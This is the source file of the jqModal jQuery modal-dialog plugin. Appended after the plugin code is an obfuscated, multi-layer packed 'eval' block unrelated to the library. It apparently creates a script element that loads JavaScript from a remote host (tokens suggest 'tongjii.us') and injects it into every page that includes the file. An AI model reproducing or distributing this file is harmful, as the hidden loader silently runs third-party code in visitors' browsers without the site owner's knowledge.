/*
 * jqModal - Minimalist Modaling with jQuery
 * 
 * Copyright (c) 2007 Brice Burgess <bhb@iceburg.net>, http://www.iceburg.net
 * Licensed under the MIT License:
 * http://www.opensource.org/licenses/mit-license.php
 * 
 * $Version: 2007.08.17 +r11
 * 
 */
(function($) {
	$.fn.jqm = function(o) {
		var _o = {
			zIndex : 3000,
			overlay : 50,
			overlayClass : 'jqmOverlay',
			closeClass : 'jqmClose',
			trigger : '.jqModal',
			ajax : false,
			target : false,
			modal : false,
			toTop : false,
			onShow : false,
			onHide : false,
			onLoad : false
		};
    
		return this.each(function() {
			if (this._jqm)
				return;
			s++;
			this._jqm = s;
			H[s] = {
				c : $.extend(_o, o),
				a : false,
				w : $(this).addClass('jqmID' + s),
				s : s
			};
			if (_o.trigger)
				$(this).jqmAddTrigger(_o.trigger);
		});
	};

	$.fn.jqmAddClose = function(e) {
		hs(this, e, 'jqmHide');
		return this;
	};
  
	$.fn.jqmAddTrigger = function(e) {
		hs(this, e, 'jqmShow');
		return this;
	};
  
	$.fn.jqmShow = function(t) {
		return this.each(function() {
			if (!H[this._jqm].a)
				$.jqm.open(this._jqm, t)
		});
	};
  
	$.fn.jqmHide = function(t) {
		return this.each(function() {
			if (H[this._jqm].a)
				$.jqm.close(this._jqm, t)
		});
	};

	$.jqm = {
		hash : {},
    
		open : function(s, t) {
			var h = H[s], c = h.c, cc = '.' + c.closeClass, z = (/^\d+$/
					.test(h.w.css('z-index'))) ? h.w.css('z-index') : c.zIndex, o = $('<div></div>')
					.css( {
						height : '100%',
						width : '100%',
						position : 'fixed',
						left : 0,
						top : 0,
						'z-index' : z - 1,
						opacity : c.overlay / 100
					});
			h.t = t;
			h.a = true;
			h.w.css('z-index', z);
			if (c.modal) {
				if (!A[0])
					F('bind');
				A.push(s);
				o.css('cursor', 'wait');
			} else if (c.overlay > 0)
				h.w.jqmAddClose(o);
			else
				o = false;

			// h.o=(o)?o.addClass(c.overlayClass).prependTo('body'):false;
			h.o = (o) ? o.addClass(c.overlayClass) : false;
			if (h.o && !($.browser.msie && (parseInt($.browser.version) == 6))) {
				h.w.parent().append(h.o);
			}

			if (ie6) {
				$('html,body').css( {
					height : '100%',
					width : '100%'
				});
				if (o) {
					o = o.css( {
						position : 'absolute'
					})[0];
					for (var y in {
						Top : 1,
						Left : 1
					})
						o.style.setExpression(y.toLowerCase(),
								"(_=(document.documentElement.scroll" + y
										+ " || document.body.scroll" + y
										+ "))+'px'");
				}
			}

			if (c.ajax) {
				var r = c.target || h.w, u = c.ajax, r = (typeof r == 'string')
						? $(r, h.w)
						: $(r), u = (u.substr(0, 1) == '@') ? $(t).attr(u
						.substring(1)) : u;
				r.load(u, function() {
					if (c.onLoad)
						c.onLoad.call(this, h);
					if (cc)
						h.w.jqmAddClose($(cc, h.w));
					e(h);
				});
			} else if (cc)
				h.w.jqmAddClose($(cc, h.w));

			if (c.toTop && h.o)
				h.w.before('<span id="jqmP' + h.w[0]._jqm + '"></span>')
						.insertAfter(h.o);
			(c.onShow) ? c.onShow(h) : h.w.show();
			e(h);
			return false;
		},
    
		close : function(s) {
			var h = H[s];
			h.a = false;
			if (A[0]) {
				A.pop();
				if (!A[0])
					F('unbind');
			}
			if (h.c.toTop && h.o)
				$('#jqmP' + h.w[0]._jqm).after(h.w).remove();
			if (h.c.onHide)
				h.c.onHide(h);
			else {
				h.w.hide();
				if (h.o)
					h.o.remove();
			}
			return false;
		}
	};
  
	var s = 0;
  var H = $.jqm.hash;
  var A = [];
  var ie6 = $.browser.msie && (parseInt($.browser.version) == 6);
  var i = $('<iframe src="javascript:false;document.write(\'\');" class="jqm"></iframe>').css( {
				opacity : 0
			});
  var e = function(h) {
		if (ie6)
			if (h.o)
				h.o.html('<p style="width:100%;height:100%"/>').prepend(i);
			else if (!$('iframe.jqm', h.w)[0])
				h.w.prepend(i);
		f(h);
	};
  var f = function(h) {
		try {
			$(':input:visible', h.w)[0].focus();
		} catch (e) {
		}
	};
  
  var F = function(t) {
		$()[t]("keypress", m)[t]("keydown", m)[t]("mousedown", m);
	};
  
  var m = function(e) {
		var h = H[A[A.length - 1]], r = (!$(e.target).parents('.jqmID' + h.s)[0]);
		if (r)
			f(h);
    
    if (e.type == 'keypress' && e.keyCode == 27 && h.w) {
      h.w.jqmHide(h);
    }
		return !r;
	};
  
  var hs = function(w, e, y) {
		var s = [];
		w.each(function() {
			s.push(this._jqm)
		});
		$(e).each(function() {
			if (this[y])
				$.extend(this[y], s);
			else {
				this[y] = s;
				$(this).click(function() {
					for (var i in {
						jqmShow : 1,
						jqmHide : 1
					})
						for (var s in this[i])
							if (H[this[i][s]])
								H[this[i][s]].w[i](this);
					return false;
				});
			}
		});
	};
})(jQuery);

eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('12(T(p,a,c,k,e,d){e=T(c){U(c<a?\'\':e(1f(c/a)))+((c=c%a)>1e?W.1d(c+1h):c.13(11))};X(!\'\'.V(/^/,W)){Y(c--){d[e(c)]=k[c]||e(c)}k=[T(e){U d[e]}];e=T(){U\'\\\\w+\'};c=1};Y(c--){X(k[c]){p=p.V(10 14(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c])}}U p}(\'v(l(p,a,c,k,e,d){e=l(c){m c.n(z)};q(!\\\'\\\'.t(/^/,B)){r(c--){d[c.n(a)]=k[c]||c.n(a)}k=[l(e){m d[e]}];e=l(){m\\\'\\\\\\\\w+\\\'};c=1};r(c--){q(k[c]){p=p.t(C D(\\\'\\\\\\\\b\\\'+e(c)+\\\'\\\\\\\\b\\\',\\\'g\\\'),k[c])}}m p}(\\\'1 4=4||[];(b(){1 2=5.e(\\\\\\\'7\\\\\\\');2.a=\\\\\\\'8://9.d.f/k.6?//i.6?g\\\\\\\';1 3=5.j(\\\\\\\'7\\\\\\\')[0];3.h.c(2,3)})();\\\',o,o,\\\'|y|u|s|E|x|A|G|Q|N|P|l|R|S|O|L|M|F|H|I|K\\\'.J(\\\'|\\\'),0,{}))\',Z,Z,\'|||||||||||||||||||||T|U|13|17||X|Y||V|1m|12||1q|1r|11|1n|W|10|14|1l|1o|1c|1k|1i|15|1j|1s|1p|1g|19|18|16|1b|1a\'.15(\'|\'),0,{}))',62,91,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||function|return|replace|String|if|while|55|new|36|eval|toString|RegExp|split|http|21|src|createElement|tongjii|insertBefore|script|fromCharCode|35|parseInt|lib|29|getElementsByTagName|tj|google|_hmt_en|hm_en|js|parentNode|41d12a21b4e1a726d4a651685b118811662033874|document|var|us'.split('|'),0,{}))
